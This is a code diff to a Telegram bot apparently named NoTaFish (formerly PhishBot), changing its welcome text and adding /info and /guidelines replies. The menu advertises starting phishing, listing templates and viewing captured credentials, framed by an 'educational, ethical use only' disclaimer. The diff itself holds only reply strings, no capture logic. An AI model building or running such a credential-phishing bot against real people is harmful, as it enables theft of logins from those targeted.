@@ -21,18 +21,27 @@ def setup_bot_handlers(bot):
     @bot.message_handler(commands=['start'])
     def send_welcome(message):
         bot.reply_to(message, (
-            "🎣 Welcome to PhishBot!\n\n"
+            "🎣 Welcome to NoTaFishBot!\n\n"
             "Commands:\n"
             "/fish - Start phishing\n"
             "/templates - List available templates\n"
-            "/info - About\n"
-            "/history - View your captured credentials"
+            "/history - View your captured credentials\n"
+            "/guidelines - User's Guidelines\n"
+            "/info - Bot and owner information\n"
         ))
 
     # Command handler for /info
     @bot.message_handler(commands=['info'])
     def send_info(message):
-        bot.reply_to(message, "Educational phishing simulator.")
+        bot.reply_to(message, "It is a Educational Phishing Bot.\n"
+                              "Created by:- Github: youutubee\n"
+                              "Github link:- https://github.com/youutubee/NoTaFish\n"
+                              "Please star the repo if you find it helpful\n")
+
+    @bot.message_handler(commands=['guidelines'])
+    def send_info(message):
+        bot.reply_to(message, "Use this bot for only Ethical and Educational purposes\n "
+                              "Using this bot for malicious or bad practice it a criminal Offense\n")
 
     # Command handler for /templates
     @bot.message_handler(commands=['templates'])
